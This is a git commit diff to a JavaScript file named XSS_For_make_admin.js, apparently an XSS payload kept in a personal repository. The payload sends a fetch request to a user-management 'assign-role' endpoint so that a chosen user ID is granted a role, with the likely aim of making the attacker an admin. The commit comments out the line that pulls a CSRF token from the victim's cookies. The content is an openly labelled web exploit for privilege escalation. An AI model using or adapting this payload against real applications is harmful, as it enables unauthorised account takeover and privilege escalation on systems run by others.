7ae2ee792ec3187322c3328e267af3e84e42154a
Praveenkumar <75465427+tpkpraveen@users.noreply.github.com>
2025-07-17 14:54:20 +0530

    Update XSS_For_make_admin.js
    removed csrf

--- JS/XSS_For_make_admin.js
+++ JS/XSS_For_make_admin.js
@@ -3,7 +3,7 @@ fetch("http://localhost:12345/ums/user-management/assign-role", {
   headers: {
     "Content-Type": "application/x-www-form-urlencoded",
     "X-Requested-With": "XMLHttpRequest",
-    "CSRF-TOKEN": document.cookie.match(/BOLD-UMS-XSRF-TOKEN=([^;]+)/)[1]
+    //"CSRF-TOKEN": document.cookie.match(/BOLD-UMS-XSRF-TOKEN=([^;]+)/)[1]
   },
   body: "users=1b6b5ae3-c116-446a-b820-60e63d4d8a81"
 })
